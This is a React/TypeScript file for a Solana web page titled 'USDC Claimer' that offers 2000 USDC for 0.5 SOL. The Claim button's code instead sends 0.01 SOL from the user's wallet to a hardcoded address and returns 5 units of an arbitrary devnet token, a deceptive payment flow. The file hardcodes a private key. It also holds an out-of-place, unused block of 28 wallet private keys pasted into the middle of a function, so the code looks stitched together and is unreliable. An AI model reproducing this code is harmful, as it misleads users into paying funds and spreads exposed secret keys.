/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4sfHG3oVekWqJpeQp961z6AQjSCJtNgjMxJWZ14GpnLaGKYQVtXK9ADYfdp6QhebqfF7CmGXF5RYLaebRAbSW366"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5Mgs6qrEok49HZmkvSU5s3minTkz9wcy28JieRhBuNpDpVkUaXgHbpfqpyShwjLEnix97jepMsAEEq5Q3XrpPBPJ",
  "key1": "QLf3pK3ArH2ccjQYbsxivJAHGyK3uc7UnAjQmUWBeap9N3W1yV895eR2smvioX5B3JxkTPD4MfJdiV5ghU6hTuK",
  "key2": "4WoRDwitpxkNbktdW2e9a8Zqm3onMzKE2D4VE2n4nkNRRQZXP8ny1xNCbv9F3maHDGn1jy9VfEv3jimSdnqxsW8X",
  "key3": "5XTN3inT2mzzUpwjMpGC5ZmT6xXhSjNgrWTDbWUKEDJE6jPTqmD9KQn3cMS4AsaNokjGCE3xBTiXnbrcUH2KxYZG",
  "key4": "41qV9xeafhmqECBYT3sdGHFHTNjbrpeykRfhfMByo2SAn53CWLjwMDnFLAv3xA8FApAXFG8tXfXhHyyy13dP5fre",
  "key5": "2XKKjsS5onhCCTggWK2zjAEvKSUJSRxbcUBP6DuNRPLSF1r9nshpAU85MHVdZvV2wWH3QxHqG9AzZHdcKBExhbsu",
  "key6": "5AyeL7gtcvP42QdJan2TqbqbJKLuYZ4HNTYenfvD9LVN4oJSwpWxJo1AGod2BntcajchLXHVW1YFCZy11zV41o3E",
  "key7": "42YHouTDVYVs7mMifSy9ApJZWBuLSvzcTfQXo4bE9GeLtDQ8gSLW3akC7MC7d8HPhqarLfGdthiF32sSaL1J4tZC",
  "key8": "ejnpqjn4miMzTy3upy9ZabJ2PogAmydGYBF9mKPZFCzPa2ZXgz1p2UBkcHk1GXG8NxY5BwitWferFJMdHwQ2iR3",
  "key9": "5vmYS7mGFE4YKUCviBXc53Htm8ux9dMdUSrACfvpGbRGVWZnktrddv6F6gZGfdwAaK7j453KgFAPFHMPwkA2k5eN",
  "key10": "2HABWdeAqTqSycnYkHUenJxRSHGW6Y6LHdGnsJYnSNSHFhK5j7jrXwC9gY7LMi2GhARePdSwqqMNZjUF4wMxoxHb",
  "key11": "4AVBdnYyoV5aTCEavESNHAiaYrZSsc9n6YDHQFtgbJcWHeZ2EGnhLQUBJENCSSQuvqXnhx7mWeJaFHL9f5eYVpBq",
  "key12": "dHhx3EFMLSEfT3nbyksuUpErzURmpjDfwyCqpAG84KEqhsXCzd4QeD32qRv3qNamUodzUxrcCwZQL6mZsLsv36h",
  "key13": "62mhjHcNxdZ5VYWeko2j6zh1x8ffKB8r298K1jDxrE48LGo6RrbAy5WdmqdXvkr3q1wfRkGqMpcmetToaYoHAZZZ",
  "key14": "2AFjPbHQU8EzFte3EYWSmtJhzc2kgHoDu7fBJKxVbmaHokq41jFPVJMfzP2zykmud2DmvV6SrTPkcYCVr1nLQCnK",
  "key15": "uqDVgJED3BKdpT7rv24sz43m853u1vJ4MARjeBRiuBoWhfmysMY8YiKWfjYkpXcLiNyYBvEY2fxVARpQkg86Ud5",
  "key16": "2MxgVCSa4csJGMdx16uKrYaEm3fvekYoX7B6ZEWKvPfLhFHfBUYpXwhn9urCD111Ppp3obm61rfdExxcfrSWn3ov",
  "key17": "2WoLcxMsHUbgFueuWMwhcM1aqmQTQHSFntNmtVYYbxNrKP7WMPmSza7xS7brrbNzTCwmFWsgDWzDroXxEXZvdRXA",
  "key18": "4bh52Htfh2Qpbz5N9RKx9VKKkHJkY8iy8w6RyLFGf6hoi5UtEdDbJHtDd6pkPh8ep9Uei3j4Nq3L4Gr2Bs7jxFia",
  "key19": "u1WATqoiXVJEZNgZaETT6ADTttV8DQojLUb6wS6YygyvkrAgEbLLurZ4D8jjRe7EorbgqGomUNJvtbJ3qPreDhH",
  "key20": "3x3wNG1kEN9urC7g5c48xvk8ZMvbExbvTH9q7ffAsw2Kx1LSpmU1gerge4ZRPudKk4fP2uYgCyRGXnDutvVSwcSU",
  "key21": "3pUSGdePwpEQe5FD7dqHRDFciTUrqgdYpbqZKAMnpS9Gn4CWxygfbhVGKVLdAJBTF2vTFoMZgVpLNEuNVchwUint",
  "key22": "2mhMZQiSGE94ZrLqgKMvDdvVLDbgN9VPW6Uz9nPEPmJ7r89Ev7xiNwVZ4Z6aUE1JMf75Z66EeKbMXuK29WeuzYnK",
  "key23": "2pG4EijrmcvSeSjrKDA65bT4HUhDQazjkuiQKWVR1jpGgizfrFt91ZPYb82gWYyxujgDqxX8Fb16mmDE4kQhpmC3",
  "key24": "63LCS2z2FGYDqaVC2RbymGaSuMCVfY3rx3rpjh5kKG7svjw417AYzr5AqxgUaqDXGtLecNBTrGL5U7GUaiygK7zy",
  "key25": "48CBqXyG4oN7udR47hXmnboTtVRTdLnayzjqPAoY6ttZSAKk4D8QeC3xfRMC8pbunM1L8eSwtBxNtS5Eq9bD3P9d",
  "key26": "mtZTcUn361xNcGZuFaMF3P3RSswEoVev8NqVGchTz47SW2LCgFn3K4LQNzxuM2CbcdYhFKxeNiDnU8hjKJy6vWv",
  "key27": "c3fJzmNfqtwyMcjmZs74THCz14sR3jSQ4T14SvL2bq4XcPDGvqXB3kdCYoAhedGPvcFY1aDZ1LnJboUofDcw9qt"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
